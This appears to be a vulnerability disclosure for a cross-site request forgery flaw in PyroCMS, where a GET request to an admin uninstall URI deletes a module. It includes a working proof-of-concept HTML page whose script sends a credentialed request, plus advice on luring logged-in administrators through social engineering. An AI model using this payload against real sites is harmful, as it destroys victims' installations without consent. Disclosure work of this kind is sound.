# Description

`pyrocms/pyrocms` is vulnerable to `Cross-site Request Forgery (CSRF)` via the admin/addons/uninstall/anomaly.module.blocks URI: an arbitrary plugin will be deleted.
Due to action is performed via GET request. An attacker can leverage this vulnerability by creating a page (which has malicious request) and host this page on his server and share this page to victims through social engineering methods. Once the victims who are already authenticated to the PyroCMS, click upon the page, unintended actions will be performed on the victim's behalf and the arbitrary plugin will be deleted.


# Steps To Reproduce-:  

Create a page with below content.

```
<!DOCTYPE>
<html>
<head>
    <title></title>
    <script type="text/javascript">
    // to delete any plugin
              var url = "http://test.com/admin/addons/uninstall/anomaly.module.blocks"
        xhr = new XMLHttpRequest();
        xhr.open("GET",url);
        xhr.withCredentials = true;
        xhr.send(null);
    </script>
</head>
<body>
<--html content here --!>
</body>
</html>
```

* Send to the victim (who is authenticated in PyroCMS as administrator) and once the victim clicks on the page, the arbitrary plugin will be deleted.
